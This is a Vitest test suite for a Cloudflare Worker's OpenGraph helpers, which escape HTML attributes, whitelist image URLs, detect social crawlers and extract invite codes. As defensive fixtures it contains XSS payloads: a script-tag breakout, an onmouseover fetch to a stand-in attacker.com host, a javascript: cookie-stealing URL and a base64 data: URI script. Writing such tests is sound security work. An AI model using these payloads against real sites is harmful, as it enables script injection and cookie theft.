import { describe, it, expect } from "vitest";
// Import helper functions from cloudflare worker script
import {
  escapeHtmlAttr,
  sanitizeImageUrl,
  isBot,
  extractInviteCode,
} from "../lib/cloudflare-worker-og.js";

describe("Cloudflare Worker OpenGraph: Security and Sanitization", () => {
  describe("escapeHtmlAttr (XSS and Attribute Injection Prevention)", () => {
    it("escapes quotes, ampersands, and angle brackets", () => {
      const input = `PG "Green" & <Luxury> 'Hostel'`;
      const expected = `PG &quot;Green&quot; &amp; &lt;Luxury&gt; &#39;Hostel&#39;`;
      expect(escapeHtmlAttr(input)).toBe(expected);
    });

    it("neutralizes attribute breakouts and script injection tags", () => {
      const payload = `"> <script>alert('XSS')</script> <meta content="`;
      const sanitized = escapeHtmlAttr(payload);
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain(`">`);
      expect(sanitized).toBe(
        `&quot;&gt; &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; &lt;meta content=&quot;`
      );
    });

    it("neutralizes event handler injection payloads", () => {
      const payload = `" onmouseover="fetch('http://attacker.com')`;
      const sanitized = escapeHtmlAttr(payload);
      expect(sanitized).toContain("&quot;");
      expect(sanitized).toBe(
        `&quot; onmouseover=&quot;fetch(&#39;http://attacker.com&#39;)`
      );
    });

    it("handles non-string and empty inputs gracefully", () => {
      expect(escapeHtmlAttr("")).toBe("");
      expect(escapeHtmlAttr(null as any)).toBe("");
      expect(escapeHtmlAttr(undefined as any)).toBe("");
    });
  });

  describe("sanitizeImageUrl (Protocol White-Listing)", () => {
    const defaultUrl = "https://example.com/pwa-512x512.png";

    it("allows valid https: image URLs", () => {
      const valid = "https://images.example.com/pg-cover.jpg";
      expect(sanitizeImageUrl(valid, defaultUrl)).toBe(valid);
    });

    it("rejects javascript: pseudo-protocol URLs", () => {
      const malicious = "javascript:alert(document.cookie)";
      expect(sanitizeImageUrl(malicious, defaultUrl)).toBe(defaultUrl);
    });

    it("rejects data: URI schemes to prevent XSS payloads", () => {
      const malicious = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";
      expect(sanitizeImageUrl(malicious, defaultUrl)).toBe(defaultUrl);
    });

    it("rejects http: plain URLs and requires secure https:", () => {
      const plainHttp = "http://insecure.example.com/photo.png";
      expect(sanitizeImageUrl(plainHttp, defaultUrl)).toBe(defaultUrl);
    });

    it("rejects invalid, relative, or malformed strings", () => {
      expect(sanitizeImageUrl("not-a-url", defaultUrl)).toBe(defaultUrl);
      expect(sanitizeImageUrl("", defaultUrl)).toBe(defaultUrl);
      expect(sanitizeImageUrl(null as any, defaultUrl)).toBe(defaultUrl);
    });
  });

  describe("isBot and extractInviteCode", () => {
    it("detects social crawlers correctly", () => {
      expect(isBot("WhatsApp/2.21.100")).toBe(true);
      expect(isBot("facebookexternalhit/1.1")).toBe(true);
      expect(isBot("TelegramBot (like TwitterBot)")).toBe(true);
      expect(isBot("Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15")).toBe(false);
    });

    it("extracts invite code from pathname or query parameter", () => {
      expect(extractInviteCode(new URL("https://pg.example.com/invite/KORAMANGALA-4B"))).toBe("KORAMANGALA-4B");
      expect(extractInviteCode(new URL("https://pg.example.com/?invite=PG999"))).toBe("PG999");
      expect(extractInviteCode(new URL("https://pg.example.com/login"))).toBeNull();
    });
  });
});
